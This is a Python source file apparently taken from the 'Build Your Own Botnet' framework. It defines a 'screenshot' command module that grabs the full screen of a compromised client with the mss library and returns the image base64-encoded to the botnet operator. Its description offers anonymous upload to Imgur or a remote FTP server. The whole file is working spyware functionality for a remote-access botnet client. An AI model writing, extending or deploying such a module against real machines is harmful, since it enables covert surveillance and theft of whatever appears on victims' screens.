#!/usr/bin/python
# -*- coding: utf-8 -*-
'Screenshot (Build Your Own Botnet)'

# standard library
import base64

# packages
import mss

# modules
import util

# globals
command = True
packages = ['mss','util']
platforms = ['win32','linux2','darwin']
usage = 'screenshot [imgur/ftp] [option=value, ...]'
description = """
Capture a screenshot on the client and optionally upload anonymously to
Imgur or to a remote FTP server (default: save image on local host machine)
"""

# main
def run():
    """
    Capture a screenshot

    """
    try:
	    with mss.mss() as screen:
	        img = screen.grab(screen.monitors[0])
	    data = util.png(img)
	    return base64.b64encode(data)
    except Exception as e:
        return "{} error: {}".format(run.__name__, str(e))
